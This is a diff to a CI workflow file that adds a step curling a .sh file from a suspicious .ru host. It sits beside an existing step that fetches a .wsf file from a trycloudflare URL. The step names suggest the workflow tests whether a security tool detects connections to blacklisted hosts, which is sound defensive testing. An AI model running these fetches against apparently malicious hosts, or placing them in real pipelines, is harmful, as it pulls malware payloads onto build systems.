@@ -84,6 +84,9 @@ jobs:
       - name: Curl blacklisted host (Custom Builtins)
         run: curl https://ethical-points-competitive-fluid.trycloudflare.com/QFB3wsf/7/8/9/uju.wsf
 
+      - name: Curl blacklisted host (Custom Builtins)
+        run: curl https://f3n7k.798u-g.ru/q6a13xi27h.sh
+
       # - name: Install with different checksum
       #   continue-on-error: true
       #   run: pip install --no-cache-dir --no-deps boto3==1.4.0 --index-url https://test.pypi.org/simple/
@@ -166,6 +169,7 @@ jobs:
           app_token: ${{ secrets.IR_API_KEY_CB_STAGE }}
           send_job_status: "true"
           debug: "true"
+
 
 
 
